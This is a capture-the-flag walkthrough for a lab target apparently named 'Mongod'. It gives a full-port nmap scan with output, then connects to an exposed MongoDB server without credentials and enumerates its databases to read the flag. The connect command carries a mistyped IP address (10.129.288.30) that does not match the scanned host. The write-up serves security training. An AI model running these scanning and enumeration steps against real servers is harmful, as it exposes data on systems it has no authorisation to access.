# Mongod

- TL;DR: Connect to a MongoDB server using the `mongo` cli tool without a username and password and get the flag in one of the database->collections->documents

## Reconnaissance

- Run an nmap scan:
```
nmap -p- --min-rate=1000 -sV 10.129.228.30

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 07:20 PDT
Nmap scan report for 10.129.228.30
Host is up (0.077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.91 seconds
```
- `-p-`: This flag scans for all TCP ports ranging from 0-65535
- `-sV`: Attempts to determine the version of the serivce running on the port.
- `--min-rate`: This specifies the minumum number of packets that Nmap should send per second; it speeds up the scan as the number goes higher.


<br>

## Exploitation

- The scan shows the following ports are open:
    - `22/tcp` running the `ssh` service
    - `27017/tcp` running the `mongodb` service
- To connect to the `mongodb` service we download the `mongo` CLI using the following commands:
    ```
    curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz`
    tar xvf mongodb-linux-x86_64-3.4.7.tgz
    ```
    - Navigate to where the `mongo` binary is present: `cd mongodb-linux-x86_64-3.4.7/bin`
- Connect to the MongoDB server running on the remote host with:
    - `mongo mongodb:10.129.288.30:27017`
- Once connected, we can run the following commands to enumerate the MongoDB server:
    - `show dbs;`: Lists out all the databases on the server
    - `use sensitive_information;`: Uses the database specified in the command
    - `show collections;`: Lists out all the collections in the database selected from the previous command
    - `db.<collection_name>.find().pretty();`: Displays the contents of the collection specified in the command. That would be `flag` in our case. Example `db.flag.find().pretty();`


